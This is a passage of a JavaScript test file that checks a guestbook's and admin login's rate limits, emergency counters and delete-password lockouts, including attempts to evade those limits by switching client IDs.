  assert.equal(first.message, prefix); assert.equal(second.message, prefix);
  await contentError(f, 'guestbook.create', { ...input, clientId: 'guestbook-client-0010', message: `${prefix}C` }, /같은 긴 메시지가 반복/);
  f.advance(600000);
  await f.call('guestbook.create', { ...input, message: ' same message ' });
});

test('guestbook and login emergency counters are global and entry-delete attempts cannot evade their window by changing client', async (t) => {
  const f = await fixture(t);
  await f.db.batch(['guestbook-emergency-window', 'admin-login-emergency-window'].map((key) => f.db.prepare('INSERT INTO rate_limit_windows VALUES (?, 120, ?)').bind(key, f.now() + 3600000)));
  await contentError(f, 'guestbook.create', { clientId: 'brand-new-client-0001', message: 'unique', deletePassword: 'pw', turnstileToken: 'guest-turnstile' }, /방명록 요청이 일시적으로 많습니다/);
  await contentError(f, 'admin.login', { password: ADMIN_PASSWORD, turnstileToken: 'admin-turnstile' }, /관리자 로그인 요청이 일시적으로 많습니다/);
  await f.seed('guestbook', [guest('entry')]);
  for (let i = 0; i < 5; i++) {
    await contentError(f, 'guestbook.hideByPassword', { id: 'entry', deletePassword: 'wrong', clientId: `client-attempt-${i}-0001` }, /삭제용 비밀번호가 맞지 않습니다/);
  }
  await contentError(f, 'guestbook.hideByPassword', { id: 'entry', deletePassword: 'new-password', clientId: 'yet-another-client-0001' }, /이 글의 삭제 비밀번호 시도가 너무 많습니다/);
  f.advance(600000);
  await contentError(f, 'guestbook.hideByPassword', { id: 'entry', deletePassword: 'wrong', clientId: 'yet-another-client-0001' }, /삭제용 비밀번호가 맞지 않습니다/);
  for (let i = 0; i < 30; i++) await contentError(f, 'guestbook.hideByPassword', { id: `missing-${i}`, deletePassword: 'pw', clientId: 'one-delete-client-0001' }, /Guestbook entry not found/);
  await contentError(f, 'guestbook.hideByPassword', { id: 'another', deletePassword: 'pw', clientId: 'one-delete-client-0001' }, /삭제 시도가 너무 많습니다/);
});
